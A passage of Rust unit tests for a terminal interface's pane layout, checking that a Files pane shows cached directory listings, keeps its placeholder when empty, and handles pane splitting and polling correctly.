        let mut app = fake_app();
        app.pane_tree = panes::Pane::single(1)
            .split(1, panes::SplitDir::Horizontal)
            .set_view(101, panes::PaneView::SessionList);
        let mut term = Terminal::new(TestBackend::new(80, 24)).unwrap();
        term.draw(|f| render(&mut app, f)).unwrap();
    }

    #[test]
    fn files_pane_renders_cached_data_not_placeholder() {
        // BUG 2: the Files pane view used a hardcoded empty vec and always showed
        // "(files — use /ls to populate)". Now it renders App::files_view. Pin:
        // with files_view populated and a pane set to PaneView::Files, the drawn
        // buffer contains the file name — proving the real data flows through.
        let mut app = fake_app();
        app.files_view = vec![FileEntry {
            name: "secret.txt".into(),
            size: 4096,
            is_dir: false,
            modified: "Jan 01".into(),
        }];
        app.pane_tree = app.pane_tree.clone().set_view(1, panes::PaneView::Files);
        let backend = TestBackend::new(80, 24);
        let mut term = Terminal::new(backend).unwrap();
        term.draw(|f| render(&mut app, f)).unwrap();
        let buf = term.backend().buffer().clone();
        let rendered: String = buf.content().iter().map(|c| c.symbol()).collect();
        assert!(
            rendered.contains("secret.txt"),
            "Files pane must render the cached file name, not a placeholder"
        );
        assert!(
            !rendered.contains("use /ls to populate"),
            "Files pane must NOT show the placeholder when data is present"
        );
    }

    #[test]
    fn files_pane_shows_placeholder_when_empty() {
        // Empty cache → the hint is still shown (operator is told how to populate).
        let mut app = fake_app();
        app.pane_tree = app.pane_tree.clone().set_view(1, panes::PaneView::Files);
        let backend = TestBackend::new(80, 24);
        let mut term = Terminal::new(backend).unwrap();
        term.draw(|f| render(&mut app, f)).unwrap();
        let rendered: String = term
            .backend()
            .buffer()
            .content()
            .iter()
            .map(|c| c.symbol())
            .collect();
        assert!(
            rendered.contains("use /ls to populate"),
            "empty Files pane must keep the hint"
        );
    }

    #[test]
    fn poll_worker_mirrors_files_into_view_cache() {
        // BUG 2 mirror contract: when a ParsedTable::Files snapshot arrives,
        // poll_worker must populate files_view (so the pane keeps the data after
        // q/Esc closes the overlay). Build a live channel, send a snapshot, and
        // assert the cache is populated + the overlay opened (both paths fed).
        let (snap_tx, snap_rx) = std::sync::mpsc::channel();
        let (_cmd_tx, cmd_rx) = std::sync::mpsc::channel();
        let mut app = App::new(Bridge {
            snapshots: snap_rx,
            cmds: _cmd_tx,
        });
        let _ = cmd_rx; // silence unused; receiver unused in this test
        snap_tx
            .send(rest::Snapshot {
                sessions: Vec::new(),
                log_lines: Vec::new(),
                connected: true,
                parsed: Some(rest::ParsedTable::Files(vec![FileEntry {
                    name: "cached.txt".into(),
                    size: 7,
                    is_dir: false,
                    modified: "Feb 02".into(),
                }])),
            })
            .unwrap();
        app.poll_worker();
        assert_eq!(
            app.files_view.len(),
            1,
            "files_view must mirror the parsed /ls result"
        );
        assert_eq!(app.files_view[0].name, "cached.txt");
        assert!(
            matches!(app.overlay, Overlay::Files(_)),
            "overlay path must still open as before"
        );
    }

    #[test]
    fn pane_split_close_focus_cycle() {
        // 完整生命周期：split → close → 焦点回退
        let mut app = fake_app();
        assert_eq!(app.pane_tree.leaf_count(), 1);
        // split：split(target=1) 创建新叶 id=101
        app.pane_tree = app
            .pane_tree
            .clone()
            .split(app.focused_pane, panes::SplitDir::Vertical);
        app.focused_pane = 101;
        assert_eq!(app.pane_tree.leaf_count(), 2);
        // close 新叶
        app.pane_tree = app.pane_tree.clone().close(101);
        app.focused_pane = app
            .pane_tree
            .leaves()
            .first()
            .map(|(id, _)| *id)
            .unwrap_or(1);
        assert_eq!(app.pane_tree.leaf_count(), 1);
    }

    #[test]
    fn poll_worker_handles_empty_channel_without_blocking() {
        let mut app = fake_app();
        // No snapshots sent; this must return immediately, not hang.
        app.poll_worker();
        assert!(!app.connected);
        assert!(app.stream.is_empty());
    }
}
